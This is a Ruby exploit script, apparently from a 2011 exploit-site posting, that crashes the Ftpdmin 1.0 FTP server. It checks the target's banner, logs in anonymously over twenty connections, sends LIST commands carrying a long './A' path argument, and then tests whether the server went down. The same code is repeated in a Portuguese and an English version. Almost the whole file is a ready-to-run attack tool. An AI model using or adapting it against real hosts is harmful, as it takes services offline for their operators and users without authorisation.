#!/usr/bin/ruby
#
#
#[+]Exploit Title: Exploit Denial of Service Ftpdmin 1.0
#[+]Date: 03\14\2011
#[+]Author: C4SS!0 G0M3S
#[+]Software Link: http://www.softpedia.com/get/Internet/Servers/FTP-Servers/ftpdmin.shtml
#[+]Version: 1.0
#[+]Tested On: WIN-XP SP3 Porguese Brazilian
#[+]CVE: N/A
#[+]Language: Portuguese and English
#
#
#       xxx     xxx        xxxxxxxxxxx        xxxxxxxxxxx        xxxxxxxxxxx
#        xxx   xxx        xxxxxxxxxxxxx      xxxxxxxxxxxxx      xxxxxxxxxxxxx  
#         xxx xxx         xxxxxxxxxxxxx      xxxxxxxxxxxxx      xxxxxxxxxxxxx                    
#          xxxxx          xxx       xxx      xxx       xxx      xxx       xxx           xxxxxx   
#           xxx           xxx       xxx      xxx       xxx      xxx       xxx          xxxxxxxx  xxxxxxxx  xxxxxxxxx
#         xxxxxx          xxx       xxx      xxx       xxx      xxx       xxx          xx    xx  xx    xx  xx
#        xxx  xxx         xxx       xxx      xxx       xxx      xxx       xxx          xx    xx  xx xxxx   xx  xxxxx
#      xxx     xxx        xxxxxxxxxxxxx      xxxxxxxxxxxxx      xxxxxxxxxxxxx   xxx    xxxxxxxx  xx   xx   xx     xx
#     xxx       xxx        xxxxxxxxxxx        xxxxxxxxxxx        xxxxxxxxxxx    xxx     xxxxxx   xx    xx  xxxxxxxxx
#
#
#Criado por C4SS!0 G0M3S
#E-mail Louredo_@hotmail.com
#Site www.exploit-br.org
#
#
#

require 'socket'
require 'fcntl'

#
#
#AQUI O EXPLOIT ESTA EM PORTUGUES
#-----------------------------------------
#
def portuguese()
def len(str)
 return str.length
end

sys = `ver`
if sys=~/Windows/
system("cls")
system("color 4f")
else
system("clear")
end

def usage()
print """

         =======================================================
         =======================================================
         ==========Exploit Denial of Service Ftpdmin 1.0========
         ==========Autor C4SS!0 G0M3S===========================
         ==========E-mail Louredo_@hotmail.com==================
         ==========Site www.exploit-br.org======================
         =======================================================
         =======================================================

"""
end

if len(ARGV)!=2 
   usage()
   print "\t\t[-]Modo de Uso: ruby #{$0} <Host> <Porta>\n"
   print "\t\t[-]Exemplo: ruby #{$0} 192.168.1.2 21\n"
   exit(0)
end
usage()
buf  = "./A" * (150/3)

host = ARGV[0]
porta = ARGV[1].to_i
print "\t\t[+]Conectando ao Servidor #{host}...\n\n"
sleep(1)
begin
s =  TCPSocket.new(host,porta)
print "\t\t[+]Checando se o Servidor e Vulneravel\n\n"
sleep(1)
rescue
print "\t\t[+]Erro ao se Conectar no Servidor\n"
exit(0)
end
banner = s.recv(2000)
s.close
unless banner =~/Minftpd/
   print "\t\t[+]Sinto Muito, o Servidor Nao e Vulneravel:(\n"
   sleep(1)
   exit(0)
 end
 print "\t\t[+]Servidor e Vulneravel:)\n\n"
 sleep(1)
 print "\t\t[+]Enviando Exploit...\n\n"
sleep(1)

i=0
while i<20
sock = TCPSocket.new(host,porta)
sock.recv(2000)
sock.puts "USER anonymous\r\n"
sock.recv(2000)
sock.puts "PASS anonymous\r\n"
sock.recv(2000)
sock.puts "LIST #{buf}\r\n"
sock.close
i+=1
end
print "\t\t[+]Exploit Enviado com Sucesso\n\n"
sleep(1)
print "\t\t[+]Checando se o Exploit Funcionou\n\n"
sleep(5)

begin
so = TCPSocket.new(host,porta)
so.send("2000")
print "\t\t[+]Sinto Muito,O Exploit Nao Funcionou:(\n\n"
rescue
print "\t\t[+]Parabens, O Exploit Funcionou com Sucesso:)\n\n"
end
end
#
#HERE THE EXPLOIT IS IN ENGLISH
#----------------------------------	
#
def english()

def len(str)
 return str.length
end

sys = `ver`
if sys=~/Windows/
system("cls")
system("color 4f")
else
system("clear")
end

def usage()
print """

         =======================================================
         =======================================================
         ==========Exploit Denial of Service Ftpdmin 1.0========
         ==========Autor C4SS!0 G0M3S===========================
         ==========E-mail Louredo_@hotmail.com==================
         ==========Site www.exploit-br.org======================
         =======================================================
         =======================================================

"""
end

if len(ARGV)!=2 
   usage()
   print "\t\t[-]Usage: ruby #{$0} <Host> <Porta>\n"
   print "\t\t[-]Exemple: ruby #{$0} 192.168.1.2 21\n"
   exit(0)
end
usage()
buf  = "./A" * (150/3)

host = ARGV[0]
porta = ARGV[1].to_i
print "\t\t[+]Connecting to Server #{host}...\n\n"
sleep(1)
begin
s =  TCPSocket.new(host,porta)
print "\t\t[+]Checking if server is vulnerable\n\n"
sleep(1)
rescue
print "\t\t[+]Error to Connect to Server\n"
exit(0)
end
banner = s.recv(2000)
s.close
unless banner =~/Minftpd/
   print "\t\t[+]I'm Sorry, the Server is not Vulnerable:(\n"
   sleep(1)
   exit(0)
 end
 print "\t\t[+]Server is Vulnerable:)\n\n"
 sleep(1)
 print "\t\t[+]Sending Exploit...\n\n"
sleep(1)

i=0
while i<20
sock = TCPSocket.new(host,porta)
sock.recv(2000)
sock.puts "USER anonymous\r\n"
sock.recv(2000)
sock.puts "PASS anonymous\r\n"
sock.recv(2000)
sock.puts "LIST #{buf}\r\n"
sock.close
i+=1
end
print "\t\t[+]Submitted Exploit Success\n\n"
sleep(1)
print "\t\t[+]Checking if the Exploit Works\n\n"
sleep(5)

begin
so = TCPSocket.new(host,porta)
so.send("2000")
print "\t\t[+]I'm Sorry, The Exploit Not Worked:(\n\n"
rescue
print "\t\t[+]Congratulations, The exploit worked with Success:)\n\n"
end

end

def start()

sis = `ver`
if sis=~/Windows/
   system("cls")
   system("color 4f")
else
 system("clear")
end

begin

f = File.open("lang.txt","r")
file = f.gets.chomp
if file == "1" 
    portuguese()
end
if file == "2"
   english()
end


rescue

print """

[+]Select Your Language:
[+]Selecine Seu Idioma:

1 - Portugues
2 - English
"""
print "\nWhat Your Language?\n=>"
lang = STDIN.gets.chomp
print lang
if lang == "1"
   f = File.open("lang.txt","w")
   f.write(1)
   f.close
   
   portuguese()
end
if lang == "2"
   f = File.open("lang.txt","w")
   f.write("2")
   f.close   
   english()
end 

end
end


if 10 == 10
   start()
end
   
